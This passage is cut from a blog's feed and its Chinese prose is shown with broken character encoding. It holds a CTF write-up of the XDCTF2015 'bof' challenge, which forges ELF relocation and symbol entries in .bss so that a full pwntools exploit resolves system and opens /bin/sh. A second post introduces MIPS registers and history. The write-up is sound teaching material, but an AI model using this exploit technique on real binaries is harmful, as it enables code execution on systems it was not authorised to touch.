ˆæº¢å‡ºï¼Œæˆ‘ä»¬é¦–å…ˆå°±æ˜¯çœ‹æœ‰æ— <code>libc</code>ï¼Œè¿™é¢˜æ²¡æœ‰ç»™å‡ºï¼Œç„¶åå°±æ˜¯åé—¨å‡½æ•°ï¼Œ<code>system( )</code>å‡½æ•°ï¼Œ<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œå¾ˆé—æ†¾éƒ½æ²¡æœ‰ï¼Œçœ‹åˆ°è¿™ä¸€èˆ¬éƒ½ä¼šæƒ³åˆ°<code>ret2libc</code>ï¼Œä½†æ˜¯å½“æˆ‘å»æŸ¥çœ‹<code>ROPgadget</code>çš„æ—¶å€™ï¼Œå‘ç°è¿™ä¸ªåŠ¨æ€é“¾æ¥çš„æ–‡ä»¶å®ƒçš„<code>gadget</code>å°‘çš„ç¦»è°±ï¼Œæ‰€ä»¥<code>ret2libc</code>è¿™æ¡è·¯ä¹Ÿèµ°ä¸é€šäº†ï¼Œé‚£åªèƒ½æ²¡æœ‰è½®å­å’±ä»¬é€ ä¸€ä¸ªè½®å­äº†â€”-<code>ret2dl_runtime_resovle</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/14.png" class=""><p>å…ˆé€šè¿‡<code>cyclic</code>è®¡ç®—ä¸€ä¸‹æº¢å‡ºçš„åç§»ä½ç½®</p><img src="/2021/10/05/ret2dl-runtime-resovle/11.png" class=""><p>ä»æºç ä¸­ä¹Ÿå¯ä»¥çœ‹å‡ºå®ƒå¹¶æ²¡æœ‰å¯¹<code>reloc_arg</code>å‚æ•°è¿›è¡Œè¾¹ç•Œæ ¡éªŒï¼Œå¯¼è‡´æˆ‘ä»¬å³ä½¿ä¼ è¿›å»çš„<code>reloc_arg</code>å†å¤§ï¼Œå®ƒä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¼ å…¥ä¸€ä¸ªå¤§çš„<code>reloc_arg</code>ï¼Œå°†é‡å®šä½è¡¨åŠ«æŒåˆ°ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼Œæ¯”å¦‚<code>.bss</code>æ®µï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å°±å¯ä»¥æƒ³åˆ°ï¼Œé€šè¿‡æ ˆè¿ç§»å°†æ ˆè¿ç§»åˆ°<code>.bss</code>æ®µ</p><p>æ ¹æ®ä¸Šé¢çš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¦æ„é€ çš„æœ‰3æ ·ä¸œè¥¿<code>.rel.plt</code>ï¼Œ<code>.dynstr</code>ï¼Œ<code>.dynsym</code></p><p>æˆ‘ä»¬ä¸€æ­¥æ­¥æ¥ï¼Œå…ˆä¼ªé€ <code>.rel.plt</code>ï¼Œ<code>.rel.plt</code>æœ‰ä¸¤ä¸ªç»“æ„ä½“æˆå‘˜ï¼Œç¬¬ä¸€ä¸ªæ˜¯<code>r_offset</code>ï¼Œä¸ºå‡½æ•°çš„<code>GOT</code>è¡¨åœ°å€ï¼Œæˆ‘ä»¬å°†å…¶å¡«å†™æˆ<code>write</code>çš„<code>GOT</code>è¡¨åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯<code>r_info</code>ï¼Œè¿™ä¸ªå°±æ¯”è¾ƒé‡è¦äº†ï¼Œæˆ‘ä»¬å…ˆæ¥å›å¿†ä¸€ä¸‹å®ƒæ˜¯æ€ä¹ˆè¢«ç´¢å¼•åˆ°çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rel.plt + reloc_arg = r_offset </span><br><span class="line"></span><br><span class="line">r_offset + <span class="number">4</span> = r_info</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆšåˆšè¯´åˆ°æºç ä¸­æ²¡æœ‰å¯¹<code>reloc_arg</code>å‚æ•°è¿›è¡Œè¾¹ç•Œæ ¡éªŒï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ <code>r_offset</code>å’Œ<code>r_info</code>åˆ°ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„åœ°æ–¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rel.plt + fake_arg = fake_r_offset </span><br><span class="line"></span><br><span class="line">fake_r_offset  + <span class="number">4</span> = fake_r_info</span><br></pre></td></tr></table></figure><p>ä»£ç å¦‚ä¸‹ï¼Œæˆ‘ä»¬å…ˆä¸å…³æ³¨<code>(fake_sym_addr - dynsym)/16</code>æ˜¯ä»€ä¹ˆæˆ‘ä»¬å…ˆç•™ä¸ªå°è±¡ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆè¦åŠ ä¸Š7å‘¢ï¼Ÿå› ä¸ºè¦ç»•è¿‡è¿™ä¸ª<code>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">relo_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">relo_info = (((fake_sym_addr - dynsym)/<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯<code>.dynsym</code>ï¼Œå®ƒæ€ä¹ˆç´¢å¼•åˆ°<code>.dynsym</code>çš„å‘¢ï¼Œæ˜¯ä¸æ˜¯<code>relo_info &gt;&gt; 8</code> ä½œä¸º<code>.dynsym</code>ä¸­çš„ä¸‹æ ‡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨<code>relo_info</code>ä¸Šåšæ‰‹è„šï¼Œé€šè¿‡<code>(fake_sym_addr - dynsym)/16</code>æ¥è®©å®ƒç´¢å¼•åˆ°<code>fake_dynsym</code>ï¼Œé™¤äº<code>16</code>æ˜¯å› ä¸ºä¸€ä¸ª<code>Elf32_Sym</code>å¤§å°æ˜¯<code>16</code>å­—èŠ‚ï¼Œè¿™é‡Œè¿˜è¦æ³¨æ„çš„æ˜¯è¦è¿›è¡Œå¯¹é½ï¼ï¼ï¼</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_sym_addr = bss_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯<code>.dynstr</code>äº†ï¼Œè¿™ä¸ªå°±å¾ˆç®€å•äº†ï¼Œåªéœ€è¦æ„é€ <code>st_name</code>è®©ä»–æ‰¾åˆ°æˆ‘ä»¬ä¼ªé€ çš„å­—ç¬¦ä¸²ï¼Œå®ƒåŸæ¥æ˜¯é€šè¿‡<code>.dynstr + st_name</code>æ¥ç´¢å¼•çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.dynstr + st_name = func_str</span><br><span class="line"></span><br><span class="line">.dynstr + fake_st_name = fake_func_str</span><br></pre></td></tr></table></figure><p>ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_str_addr = fake_sym_addr + <span class="number">16</span></span><br><span class="line"></span><br><span class="line">fake_name = fake_str_addr - strtab</span><br></pre></td></tr></table></figure><p>å®Œæ•´EXPï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bof&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;bof&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> + stack_size</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">pop_ebp_ret = <span class="number">0x804861b</span></span><br><span class="line">leave_ret = <span class="number">0x8048458</span></span><br><span class="line">link_map = <span class="number">0x8048380</span></span><br><span class="line">dynsym = <span class="number">0x80481d8</span></span><br><span class="line">strtab = <span class="number">0x08048278</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span></span><br><span class="line">pop_esi_pop_edi_pop_ebp_ret = <span class="number">0x08048619</span></span><br><span class="line"><span class="comment">#align = 0x10 - ((bss_addr + 36 - dynsym) % 16) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pop_esi_pop_edi_pop_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#arge</span></span><br><span class="line">fake_relo_addr = bss_addr + <span class="number">28</span></span><br><span class="line">fake_arge = fake_relo_addr - rel_plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#sym</span></span><br><span class="line">fake_sym_addr = bss_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"></span><br><span class="line"><span class="comment">#relo</span></span><br><span class="line">relo_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">relo_info = (((fake_sym_addr - dynsym)/<span class="number">16</span>) &lt;&lt; <span class="number">8</span>)+<span class="number">0x7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;relo &quot;</span> + <span class="built_in">hex</span>(relo_info))</span><br><span class="line"></span><br><span class="line"><span class="comment">#str</span></span><br><span class="line">fake_str_addr = fake_sym_addr + <span class="number">16</span></span><br><span class="line">fake_name = fake_str_addr - strtab</span><br><span class="line">bin_sh_addr = bss_addr + <span class="number">80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(link_map)</span><br><span class="line">payload += p32(fake_arge)</span><br><span class="line">payload += <span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += p32(relo_offset)</span><br><span class="line">payload += p32(relo_info)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(fake_name)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += &quot;/bin/sh\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFå°çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»MIPSçš„å‘å±•å²å¼€å§‹å­¦MIPS</title>
      <link href="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/"/>
      <url>/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/</url>
      
        <content type="html"><![CDATA[<h2 id="èµ·æº"><a href="#èµ·æº" class="headerlink" title="èµ·æº"></a>èµ·æº</h2><p>â€‹        å½“åˆå’ŒARMæ¯”è‚©çš„MIPSï¼Œç”±äºå†³ç­–çš„é—®é¢˜å’Œå‘½é€”å¤šèˆ›ï¼ŒMIPSæ¶æ„å¼€å§‹é€æ¸æ²¡è½ï¼Œæ›¾ç»çš„è¾‰ç…Œä¹Ÿæ…¢æ…¢æš—æ·¡ï¼Œä½†ä¸–é—´è¿˜æ®‹ç•™ç€MIPSæ¶æ„çš„ä½™å…‰ï¼Œåœ¨ç›®å‰çš„æ¸¸æˆæœºï¼Œæ‰“å°æœºï¼Œè·¯ç”±å™¨è¿˜æœ‰å¾ˆå¤šæ˜¯MIPSæ¶æ„çš„CPUï¼Œæ‰€ä»¥MIPSçš„å­¦ä¹ å¹¶ä¸èƒ½è½ä¸‹ï¼Œè€Œä¸”å­¦ä¹ å„ç§CPUæ¶æ„çš„è®¾è®¡æ€è·¯ï¼Œå¯¹äºç†è§£è®¡ç®—æœºä¹Ÿæœ‰ç€å¾ˆå¤§çš„å¸®åŠ©ï¼Œè™½ç„¶MIPSæ²¡è½äº†ï¼Œä½†RISC-Vä¼šå¸¦ç€å®ƒçš„ä½™å…‰ç»§ç»­å‰è¿›â€¦</p><p><a href="https://zhuanlan.zhihu.com/p/356011887">å…¨çƒä¸‰å¤§èŠ¯ç‰‡æ¶æ„ä¹‹ä¸€MIPSå€’ä¸‹ï¼è½¬èº«æŠ•å…¥RISC-Vé˜µè¥</a></p><p><a href="https://zhuanlan.zhihu.com/p/97572364">MIPSï¼Œè·¯åœ¨ä½•æ–¹ï¼Ÿ</a></p><h2 id="MIPSå„å¯„å­˜å™¨ä»‹ç»ä¸å¯¹æ¯”"><a href="#MIPSå„å¯„å­˜å™¨ä»‹ç»ä¸å¯¹æ¯”" class="headerlink" title="MIPSå„å¯„å­˜å™¨ä»‹ç»ä¸å¯¹æ¯”"></a>MIPSå„å¯„å­˜å™¨ä»‹ç»ä¸å¯¹æ¯”</h2><p>ä¸ARMå’Œç›¸æ¯”ï¼ŒMIPSä¹Ÿæœ‰å¾ˆå¤šç‰¹æ®Šçš„ç‰¹æ€§ï¼Œè¿™äº›ç‰¹æ€§éƒ½æ—¨åœ¨å¸®åŠ©CPUæ›´å¥½çš„å®Œæˆå·¥ä½œ</p><ol><li><p><strong>$zeroå¯„å­˜å™¨</strong>æ—¶åˆ»ä¿å­˜ç€å¸¸é‡0ï¼Œè‡³äºä¸ºä»€ä¹ˆè¿™ä¹ˆåšï¼Œç­”ï¼šè¿˜æ˜¯ä¸ºäº†æ•ˆç‡</p><blockquote><p>é›¶å¯„å­˜å™¨å§‹ç»ˆä¿æŒå¸¸é‡ 0ï¼Œé™¤äº† 0 æ°å¥½æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å¸¸é‡è¿™ä¸€äº‹å®ä¹‹å¤–ï¼Œå®ƒå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„ã€‚å¦‚æ­¤æœ‰ç”¨ä»¥è‡³äº MIPS è®¾è®¡è€…ä¸“é—¨ä½¿ç”¨ä¸€ä¸ªå¯„å­˜å™¨æ¥ä¿å­˜å…¶å€¼ã€‚ï¼ˆè¿™æ ·ä½ å°±ä¸å¿…æµªè´¹å¦ä¸€ä¸ªå¯„å­˜å™¨æˆ–ä»»ä½•å†…å­˜æ¥ä¿å­˜å€¼ã€‚ï¼‰</p></blockquote></li><li><blockquote><p>$1:å³$atï¼Œè¯¥å¯„å­˜å™¨ä¸ºæ±‡ç¼–ä¿ç•™ï¼Œç”±äº<a href="https://blog.csdn.net/wlswls1711/article/details/106364882/">Iå‹æŒ‡ä»¤</a>çš„ç«‹å³æ•°å­—æ®µåªæœ‰16ä½ï¼Œåœ¨åŠ è½½å¤§å¸¸æ•°æ—¶ï¼Œç¼–è¯‘å™¨æˆ–æ±‡ç¼–ç¨‹åºéœ€è¦<br>æŠŠå¤§å¸¸æ•°æ‹†å¼€ï¼Œç„¶åé‡æ–°ç»„åˆåˆ°å¯„å­˜å™¨é‡Œã€‚æ¯”å¦‚åŠ è½½ä¸€ä¸ª32ä½ç«‹å³æ•°éœ€è¦ luiï¼ˆè£…å…¥é«˜ä½ç«‹å³æ•°ï¼‰å’Œaddiä¸¤æ¡<br>æŒ‡ä»¤ã€‚åƒMIPSç¨‹åºæ‹†æ•£å’Œé‡è£…å¤§å¸¸æ•°ç”±æ±‡ç¼–ç¨‹åºæ¥å®Œæˆï¼Œæ±‡ç¼–ç¨‹åºå¿…éœ€ä¸€ä¸ªä¸´æ—¶å¯„å­˜å™¨æ¥é‡ç»„å¤§å¸¸æ•°ï¼Œè¿™<br>ä¹Ÿæ˜¯ä¸ºæ±‡ç¼– ä¿ç•™$atçš„åŸå› ä¹‹ä¸€</p></blockquote><img src="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/3.png" class=""></li><li><p>v0<del>v1æ˜¯å‡½æ•°è°ƒç”¨è¿”å›ä¹‹åçš„å€¼ï¼Œvä¹Ÿå°±æ˜¯valuesçš„æ„æ€ï¼Œa0</del>a3å°±æ˜¯å‡½æ•°çš„å‚æ•°ï¼Œå¦‚æœæœ‰æ›´å¤šçš„å‚æ•°ï¼Œåˆ™é€šè¿‡æ ˆæ¥ä¼ é€’ï¼Œt0<del>t9éƒ½æ˜¯Temporaryå¯„å­˜å™¨ï¼Œå¯ä»¥ç†è§£ä¸ºéšä¾¿ä½¿ç”¨ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯t7å’Œt8ï¼Œt9å¹¶ä¸æ˜¯æŒ¨åœ¨ä¸€èµ·çš„ï¼Œä¸­é—´è¿˜æç€s0</del>s7ï¼Œç€8ä¸ªå¯„å­˜å™¨é‚£å°±ä¸æ˜¯éšä¾¿ä½¿ç”¨çš„äº†ï¼Œå¦‚æœè¦ä½¿ç”¨ä»–ä»¬å¿…é¡»å°†ä»–ä»¬ä¿å­˜ï¼Œå¦åˆ™ç¨‹åºå¯èƒ½ä¼šå‡ºç°éé¢„æœŸçš„é”™è¯¯ï¼Œk0~k1æ˜¯ç»™æ“ä½œç³»ç»Ÿä½¿ç”¨çš„ï¼Œæš‚ä¸è€ƒè™‘</p></li><li><p>å‰©ä¸‹çš„å°±æ˜¯æœ‰ç‰¹æ®Šç”¨é€”çš„å¯„å­˜å™¨ï¼Œå¯¹åº”çš„è‹±æ–‡ä¹Ÿæ ‡è¯†äº†ï¼Œå¾ˆå®¹æ˜“ç†è§£ï¼Œè¿™é‡Œå¼ºè°ƒä¸€ä¸‹$raå¯„å­˜å™¨ï¼Œå½“è°ƒç”¨çš„å‡½æ•°å±äºå¶å­å‡½æ•°çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠŠè¿”å›å€¼æ”¾åˆ°$raå¯„å­˜å™¨é‡Œé¢ï¼Œè‹¥æ˜¯éå¶å­å‡½æ•°çš„è¯ï¼Œå°±ä¼šæŠŠè¿”å›åœ°å€æ”¾åˆ°æ ˆä¸Šï¼Œç¨å¾®è§£é‡Šä¸€ä¸‹å¶å­å‡½æ•°ï¼šæ­¤å‡½æ•°è‡ªèº«ä¸å†è°ƒç”¨åˆ«çš„å‡½æ•°å°±ç§°ä¹‹ä¸ºå¶å­å‡½æ•°</p></li></ol><table><thead><tr><th align="left">å¯„å­˜å™¨ç¼–å·</th><th align="left">åˆ«å</th><th align="left">ç”¨é€”</th></tr></thead><tbody><tr><td align="left">$0</td><td align="left">$zero</td><td align="left">å¸¸é‡0(constant value 0)</td></tr><tr><td align="left">$1</td><td align="left">$at</td><td align="left">ä¿ç•™ç»™æ±‡ç¼–å™¨(Reserved for assembler)</td></tr><tr><td align="left">$2-$3</td><td align="left">$v0-$v1</td><td align="left">å‡½æ•°è°ƒç”¨è¿”å›å€¼(values for results and expression evaluation)</td></tr><tr><td align="left">$4-$7</td><td align="left">$a0-$a3</td><td align="left">å‡½æ•°è°ƒç”¨å‚æ•°(arguments)</td></tr><tr><td align="left">$8-$15</td><td align="left">$t0-$t7</td><td align="left">æš‚æ—¶çš„(Temporary)</td></tr><tr><td align="left">$16-$23</td><td align="left">$s0-$s7</td><td align="left">ä¿å­˜çš„(æˆ–å¦‚æœç”¨ï¼Œéœ€è¦SAVE/RESTOREçš„)</td></tr><tr><td align="left">$24-$25</td><td align="left">$t8-$t9</td><td align="left">æš‚æ—¶çš„(Temporary)</td></tr><tr><td align="left">$26-$27</td><td align="left">$k0-$k1</td><td align="left">å†…æ ¸çš„(kernel)</td></tr><tr><td align="left">$28</td><td align="left">$gp</td><td align="left">å…¨å±€æŒ‡é’ˆ(Global Pointer)</td></tr><tr><td align="left">$29</td><td align="left">$sp</td><td align="left">å †æ ˆæŒ‡é’ˆ(Stack Pointer)</td></tr><tr><td align="left">$30</td><td align="left">$fp/$s8</td><td align="left">æ ˆå¸§æŒ‡é’ˆ(Frame Pointer)</td></tr><tr><td align="left">$31</td><td align="left">$ra</td><td align="left">è¿”å›åœ°å€(return address)</td></tr></tbody></table><p>MIPSå¯„å­˜å™¨ç»å…¸è¡¨æ ¼ï¼Œä½†æ˜¯æˆ‘çœ‹åˆ°ä¹‹åå°±æœ‰ç‚¹ç–‘æƒ‘ï¼Œä¸ºå•¥MIPSçš„å¯„å­˜å™¨æœ‰ä¸ªåˆ«åçš„ä¸œè¥¿ï¼Œå¥‡äº†æ€ªäº†ï¼Œè¿˜çœŸæ²¡è§è¿‡ï¼Œé‚£å®ƒä¸ºå•¥è¦æœ‰åˆ«åå‘¢ï¼Ÿç½‘ä¸Šçš„è§£é‡Šæ˜¯â€æ³¨è®°ç¬¦â€ï¼Œä½†æ˜¯å®ƒæ—¢ç„¶å¥½è®°ä¸ºå•¥ä¸ç›´æ¥æ‹¿å®ƒå‘½åå‘¢ï¼Ÿåœ¨ARMä¸Šä¹Ÿæ˜¯ä»¥rå¼€å¤´å‘½åçš„ï¼Œå¹¶æ²¡æœ‰è¿™ä¹ˆæ˜“æ‡‚çš„åˆ«å</p><p><a href="https://mathcs.holycross.edu/~csci226/MIPS/summaryHO.pdf">The MIPS Instruction Set</a></p><p>åœ¨å’Œå¸¸è§çš„X86å’ŒX64å¯¹æ¯”ä¸‹æ›´å®¹æ˜“æ˜ç™½ä»–ä»¬ä¹‹é—´çš„å·®åˆ«å’Œå„è‡ªçš„å¥½å¤„ï¼š</p><table><thead><tr><th>æ¶æ„</th><th>x86</th><th>X64</th><th>ARM</th><th>MIPS</th></tr></thead><tbody><tr><td>å‡½æ•°è¿”å›å€¼</td><td>eax</td><td>rax</td><td>r0</td><td>v0~v1</td></tr><tr><td>å‡½æ•°è°ƒç”¨å‚æ•°</td><td>æ ˆ</td><td>rdi-rsi-rdx-rcx-r8-r9ï¼›æ ˆ</td><td>r0~r3ï¼›æ ˆ</td><td>a0~a3ï¼›æ ˆ</td></tr><tr><td>æ ˆæŒ‡é’ˆ</td><td>ebpï¼›esp</td><td>rbpï¼›rsp</td><td>fp(r11)ï¼›sp(r13)</td><td>fp/s8ï¼›sp</td></tr><tr><td>è¿”å›åœ°å€</td><td>è¿›å…¥å­å‡½æ•°æ—¶ä¼šå°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­</td><td>è¿›å…¥å­å‡½æ•°æ—¶ä¼šå°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­</td><td>lr(r14)å¯„å­˜å™¨ä¿å­˜ç€å­ç¨‹åºçš„è¿”å›åœ°å€</td><td>raå¯„å­˜å™¨ä¿ç•™ç¨‹åºçš„è¿”å›åœ°å€ï¼ˆå¶å­å‡½æ•°ï¼‰</td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="MIPSæ±‡ç¼–æŒ‡ä»¤"><a href="#MIPSæ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="MIPSæ±‡ç¼–æŒ‡ä»¤"></a>MIPSæ±‡ç¼–æŒ‡ä»¤</h2><img src="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/1.png" class=""><p>IDAä¸Šæœ‰ä¸ªå¾ˆå¥½ç”¨çš„é€‰é¡¹ï¼ŒOptions =&gt; General =&gt; Auto comments ï¼Œå½“ä½ æŠŠå®ƒå‹¾é€‰ä¸Šçš„æ—¶å€™ï¼ŒIDAä¼šåœ¨ä¸€äº›æŒ‡ä»¤çš„æ—è¾¹æ˜¾ç¤ºæ³¨é‡Šå¸®åŠ©ä½ ç†è§£è¿™æ¡æ±‡ç¼–æŒ‡ä»¤å¤§è‡´åœ¨åšä»€ä¹ˆäº‹æƒ…ï¼š</p><img src="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/2.jpg" class=""><h2 id="MPISç¼“å­˜é—®é¢˜"><a href="#MPISç¼“å­˜é—®é¢˜" class="headerlink" title="MPISç¼“å­˜é—®é¢˜"></a>MPISç¼“å­˜é—®é¢˜</h2><p><a href="https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm">ä¸ºä»€ä¹ˆæˆ‘å®Œç¾çš„ Shellcode ä¸èµ·ä½œç”¨ï¼Ÿï¼šMIPS å’Œ ARM ä¸Šçš„ç¼“å­˜ä¸€è‡´æ€§</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MIPS!MIPS!MIPS! </tag>
            
